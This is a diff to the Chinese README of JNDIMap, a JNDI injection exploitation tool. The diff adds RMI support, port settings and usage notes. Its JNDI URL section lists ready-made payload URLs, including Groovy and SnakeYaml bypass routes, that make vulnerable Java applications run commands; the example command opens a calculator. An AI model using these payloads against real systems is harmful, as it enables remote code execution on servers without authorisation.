@@ -1,6 +1,6 @@
 # JNDIMap
 
-JNDIMap 是一个 JNDI 注入利用工具
+JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议
 
 目前支持以下功能
 
@@ -16,12 +16,14 @@ JNDIMap 是一个 JNDI 注入利用工具
 ## Usage
 
 ```bash
-Usage: java -jar JNDIMap.jar -i <ldapHost> -r <httpHost> -l <ldapPort> -p <httpPort>
+Usage: java -jar JNDIMap.jar -h <httpHost> -r <rmiPort> -l <ldapPort> -p <httpPort>
 ````
 
-ldapHost: LDAP 服务器监听地址, 默认为 `0.0.0.0`
+RMI 和 LDAP 服务器监听地址默认为 `0.0.0.0`
 
 httpHost: HTTP 服务器监听地址, 同时为 codebase 地址 (必须指定为一个目标服务器可访问到的地址, 例如 `192.168.1.100`, 不能用 `0.0.0.0`)
+
+rmiPort: RMI 服务器监听端口, 默认为 `1099`
 
 ldapPort: LDAP 服务器监听端口, 默认为 `1389`
 
@@ -30,6 +32,10 @@ httpPort: HTTP 服务器监听端口, 默认为 `3456`
 ## JNDI URL
 
 注意传入的 Base64 均为 **Base64 URL 编码**, 即把 `+` 和 `/` 替换为 `-` 和 `_`
+
+以下路由除 `/Deserialize/*` (LDAP 反序列化) 以外, 均支持 RMI 和 LDAP 协议
+
+对于 RMI 协议, 只需要将 `ldap://127.0.0.1:1389/` 替换为 `rmi://127.0.0.1:1099/` 即可
 
 ```bash
 # DnsLog
@@ -56,7 +62,6 @@ ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator
 ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
 
 # SnakeYaml Bypass
-ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
 ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
 
 # MLet 探测可用 Gadget
